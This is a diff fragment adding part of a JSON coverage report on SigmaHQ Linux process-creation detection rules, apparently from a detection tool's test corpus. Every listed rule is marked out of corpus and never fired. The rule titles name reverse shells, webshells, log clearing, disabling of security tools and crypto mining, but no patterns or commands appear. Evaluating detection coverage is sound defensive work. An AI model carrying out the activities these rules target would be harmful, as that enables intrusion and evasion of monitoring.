+      "id": "78a80655-a51e-4669-bc6b-e9d206a462ee",
+      "title": "Install Root Certificate",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_install_root_certificate.yml",
+      "technique_ids": [
+        "T1553.004"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "80915f59-9b56-4616-9de0-fd0dea6c12fe",
+      "title": "Linux Logs Clearing Attempts",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_clear_logs.yml",
+      "technique_ids": [
+        "T1685.006"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "818f7b24-0fba-4c49-a073-8b755573b9c7",
+      "title": "Linux Webshell Indicators",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_webshell_detection.yml",
+      "technique_ids": [
+        "T1505.003"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "84c9e83c-599a-458a-a0cb-0ecce44e807a",
+      "title": "UFW Disable Attempt",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_disable_ufw.yml",
+      "technique_ids": [
+        "T1686"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "9069ea3c-b213-4c52-be13-86506a227ab1",
+      "title": "Linux Crypto Mining Indicators",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_crypto_mining.yml",
+      "technique_ids": [
+        "T1496"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "97de11cd-4b67-4abf-9a8b-1020e670aa9e",
+      "title": "Pnscan Binary Data Transmission Activity",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_pnscan_binary_cli_pattern.yml",
+      "technique_ids": [
+        "T1046"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "999c3b12-0a8c-40b6-8e13-dd7d62b75c7a",
+      "title": "Potentially Suspicious Named Pipe Created Via Mkfifo",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "9d779ce8-5256-4b13-8b6f-b91c602b43f4",
+      "title": "Named Pipe Created Via Mkfifo",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_mkfifo_named_pipe_creation.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "a015e032-146d-4717-8944-7a1884122111",
+      "title": "Linux HackTool Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_hktl_execution.yml",
+      "technique_ids": [
+        "T1587"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "b8bdac18-c06e-4016-ac30-221553e74f59",
+      "title": "Potential Ruby Reverse Shell",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_ruby_reverse_shell.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "bed26dea-4525-47f4-b24a-76e30e44ffb0",
+      "title": "Audit Rules Deleted Via Auditctl",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_auditctl_clear_rules.yml",
+      "technique_ids": [
+        "T1685.004"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "c2e234de-03a3-41e1-b39a-1e56dc17ba67",
+      "title": "Remove Scheduled Cron Task/Job",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_crontab_removal.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "c6714a24-d7d5-4283-a36b-3ffd091d5f7e",
+      "title": "Potential PHP Reverse Shell",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_php_reverse_shell.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "cfec9d29-64ec-4a0f-9ffe-0fdb856d5446",
+      "title": "Suspicious Git Clone - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_git_clone.yml",
+      "technique_ids": [
+        "T1593.003"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "e3a8a052-111f-4606-9aee-f28ebeb76776",
+      "title": "Disabling Security Tools",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_security_tools_disabling.yml",
+      "technique_ids": [
+        "T1686"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "ec127035-a636-4b9a-8555-0efd4e59f316",
+      "title": "Clipboard Collection with Xclip Tool",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_clipboard_collection.yml",
+      "technique_ids": [
+        "T1115"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "ec52985a-d024-41e3-8ff6-14169039a0b3",
+      "title": "Mount Execution With Hidepid Parameter",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_mount_hidepid.yml",
+      "technique_ids": [
+        "T1564"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "f2bed782-994e-4f40-9cd5-518198cb3fba",
+      "title": "Linux Sudo Chroot Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_chroot_execution.yml",
+      "technique_ids": [
+        "T1068"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "f9b3edc5-3322-4fc7-8aa3-245d646cc4b7",
+      "title": "Potential Linux Amazon SSM Agent Hijacking",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_ssm_agent_abuse.yml",
+      "technique_ids": [
+        "T1219.002"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    }
+  ],
+  "unevaluable": [],
+  "duplicate_ids": []
+}
